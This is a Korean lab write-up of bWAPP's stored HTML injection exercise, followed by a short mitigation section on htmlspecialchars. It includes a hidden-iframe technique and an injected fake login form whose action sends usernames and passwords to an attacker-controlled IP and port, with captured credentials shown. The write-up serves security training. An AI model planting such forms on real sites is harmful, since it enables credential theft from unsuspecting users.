---
title: "[bWAPP] 1. Injection - HTML Injection - Stored"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## Injection - Stored

공격자가 서버(게시판)에 태그/스크립트를 저장시켜, 클라이언트가 게시판을 읽을 경우 태그/스크립트가 실행되는 방식.

이로 인해 쿠키 정보 탈취, 악성 코드 유입, 랜섬웨어 등의 피해로 이어질 수 있음.

<br>

<br>

## HTML Injection - Stored(Blog)

![image-20220316004330740](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316004330740.png)

- 블로그 게시판 방식

<br>

### Iframe 이용

### iframe

inline frame으로서 해당 웹 페이지 안에 어떠한 제한 없이 또 다른 하나의 웹 페이지를 삽입 가능

![image-20220316005939311](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316005939311.png)

![image-20220316005851328](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316005851328.png)

![image-20220316004856928](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316004856928.png)

- 먼저 리눅스에서 포트를 열어주고
- 다음과 같이 사이즈를 모두 0으로하고 호스트주소는 칼리리눅스IP(연결할 서버 IP), 포트는 연결할 포트번호로 지정해주어 삽입할 웹 페이지를 숨겨준 후에 지정한 포트로 연결을 시도해보자

<br>

### 리눅스

![image-20220316005724268](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316005724268.png)

- 연결 확인

<br>

### 로그인 폼 생성

![image-20220316010219273](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316010219273.png)

```html
<form name="login" action="http://192.168.15.130:1234/test.html">
<table>
<tr><td>Username:</td><td><input type="text" name="username"/></td></tr>
<tr><td>Password:</td><td><input type="password"" name="password"/></td></tr>
</table>
<input type="submit" value="Login" />
</form>
```

<br>

![image-20220316005939311](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316005939311.png)

- 다시 포트 열어준 후

<br>

![image-20220316010302249](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316010302249.png)

- 로그인

<br>

### 결과

![image-20220316011025192](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316011025192.png)

- 다음과 같이 계정 정보 얻을 수 있음

<br>

<br>

## 대응방안

### Linux

![image-20220317223333716](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317223333716.png)

![image-20220317221054644](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317221054644.png)

- vi 편집기로 htmli_stored.php 소스코드 열어준다.
- 레벨 확인
- Medium과 High 모두 xss_check3를 사용

<br>

### functions_external.php

![image-20220317221339359](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317221339359.png)

- xss_check_3 에서는 htmlspecialchars 함수를 사용하고 있는데 
- htmlspecialchars 는 메타 문자가 html 태그로 사용되지 않도록 방지하여 입력값 그대로 출력하게 함으로써 취약점에 대응하고 있다.
